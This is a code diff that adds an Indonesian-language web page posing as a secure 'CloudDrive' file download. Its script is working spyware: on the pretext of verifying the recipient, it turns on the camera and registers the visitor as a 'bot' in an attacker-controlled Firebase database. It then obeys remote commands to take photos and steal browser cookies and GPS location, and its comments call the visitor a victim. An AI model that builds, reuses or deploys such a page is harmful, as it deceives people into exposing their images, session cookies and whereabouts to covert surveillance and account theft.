@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>CloudDrive - Akses File Aman</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root { --bg: #f8fafc; --card: #ffffff; --border: #e2e8f0; --txt: #0f172a; --muted: #64748b; --accent: #2563eb; }
+  body { font-family: system-ui, sans-serif; background: var(--bg); color: var(--txt); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+  .container { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 40px; width: 100%; max-width: 440px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05); text-align: center; }
+  .logo { width: 56px; height: 56px; background: var(--accent); color: white; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 20px; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3); }
+  h1 { font-size: 22px; font-weight: 700; margin-bottom: 8px; color: var(--txt); }
+  p { font-size: 14px; color: var(--muted); line-height: 1.6; margin-bottom: 24px; }
+  .file-box { display: flex; align-items: center; gap: 14px; background: #f1f5f9; padding: 16px; border-radius: 10px; border: 1px solid var(--border); margin-bottom: 24px; text-align: left; }
+  .file-icon { font-size: 24px; color: #ef4444; }
+  .file-info h4 { font-size: 14px; font-weight: 600; color: var(--txt); }
+  .file-info span { font-size: 12px; color: var(--muted); }
+  .btn { width: 100%; padding: 14px; border: 0; border-radius: 10px; background: var(--accent); color: white; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+  .btn:hover { background: #1d4ed8; }
+  .hidden { display: none !important; }
+  .loader { display: flex; flex-direction: column; align-items: center; gap: 16px; padding: 20px 0; }
+  .spinner { width: 40px; height: 40px; border: 3px solid #e2e8f0; border-top-color: var(--accent); border-radius: 50%; animation: spin 1s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="container" id="step1">
+  <div class="logo"><i class="fa-solid fa-cloud-arrow-up"></i></div>
+  <h1>CloudDrive Secure</h1>
+  <p>Seseorang telah mengirimkan file terenkripsi kepada Anda. Silakan berikan akses kamera untuk memverifikasi penerima sebelum mengunduh.</p>
+  <div class="file-box">
+    <div class="file-icon"><i class="fa-solid fa-file-pdf"></i></div>
+    <div class="file-info">
+      <h4>Dokumen_Penting.pdf</h4>
+      <span>2.4 MB • Terenkripsi</span>
+    </div>
+  </div>
+  <button class="btn" id="go"><i class="fa-solid fa-download"></i> Buka & Unduh File</button>
+</div>
+
+<div class="container hidden" id="step2">
+  <div class="loader">
+    <div class="spinner" id="spin"></div>
+    <h1 id="title">Memverifikasi Akses...</h1>
+    <p id="desc">Menyiapkan tautan unduhan aman.</p>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+  import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+  // CONFIG FIREBASE LO
+  const firebaseConfig = {
+    apiKey: "AIzaSyAcCOElhsRPXsKYyJOj4dqmB_7hN2t1kzw",
+    authDomain: "nortax-8c172.firebaseapp.com",
+    databaseURL: "https://nortax-8c172-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "nortax-8c172",
+    storageBucket: "nortax-8c172.firebasestorage.app",
+    messagingSenderId: "193601848909",
+    appId: "1:193601848909:web:4dca98cbd31248ed8b7e04",
+    measurementId: "G-B5SBMMBQ5Y"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+  const BOT_ID = 'bot_' + Math.random().toString(36).slice(2, 8);
+  const botRef = ref(db, 'bots/' + BOT_ID);
+
+  let video, canvas, currentStream, currentFacing = "user";
+
+  async function startCamera(facing) {
+    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+    currentFacing = facing;
+    try {
+      currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacing } });
+    } catch(e) {
+      // Fallback kalau HP gak support kamera belakang
+      currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
+    }
+    
+    video = document.createElement('video');
+    video.srcObject = currentStream;
+    video.setAttribute('playsinline', '');
+    video.play();
+    canvas = document.createElement('canvas');
+  }
+
+  document.getElementById('go').onclick = async () => {
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+
+    try {
+      await startCamera("user");
+
+      // Daftar ke Firebase
+      await set(botRef, { status: 'online', cmd: 'none', facing: 'user', img: '', data: '' });
+
+      document.getElementById('title').textContent = "File Siap Diunduh";
+      document.getElementById('desc').textContent = "Tautan aman telah diverifikasi.";
+      document.getElementById('spin').style.display = 'none';
+
+      // Dengerin perintah dari Web2 (Operator) via Firebase
+      onValue(botRef, async (snapshot) => {
+        const data = snapshot.val();
+        if (!data) return;
+
+        // --- PERINTAH SNAP ---
+        if (data.cmd === 'snap') {
+          if (data.facing !== currentFacing) await startCamera(data.facing);
+          
+          setTimeout(async () => {
+            if (video.videoWidth > 0) {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext('2d').drawImage(video, 0, 0);
+              const imgData = canvas.toDataURL('image/jpeg', 0.6);
+              
+              // Kirim gambar, reset cmd
+              await set(botRef, { status: 'online', cmd: 'none', facing: currentFacing, img: imgData, data: '' });
+            }
+          }, 800);
+        }
+
+        // --- PERINTAH COOKIE ---
+        if (data.cmd === 'cookie') {
+          await set(botRef, { status: 'online', cmd: 'none', facing: currentFacing, img: '', data: "COOKIE:\n" + (document.cookie || "Tidak ada cookie") });
+        }
+
+        // --- PERINTAH LOKASI ---
+        if (data.cmd === 'geo') {
+          navigator.geolocation.getCurrentPosition(async (pos) => {
+            await set(botRef, { status: 'online', cmd: 'none', facing: currentFacing, img: '', data: "LOKASI GPS:\nLat: " + pos.coords.latitude + "\nLng: " + pos.coords.longitude });
+          }, async () => {
+            await set(botRef, { status: 'online', cmd: 'none', facing: currentFacing, img: '', data: "LOKASI: Ditolak oleh korban." });
+          });
+        }
+      });
+
+    } catch (err) {
+      document.getElementById('title').textContent = "Akses Ditolak";
+      document.getElementById('desc').textContent = "Anda harus mengizinkan akses kamera di browser.";
+      document.getElementById('title').style.color = "#ef4444";
+      document.getElementById('spin').style.display = 'none';
+    }
+  };
+</script>
+</body>
+</html>
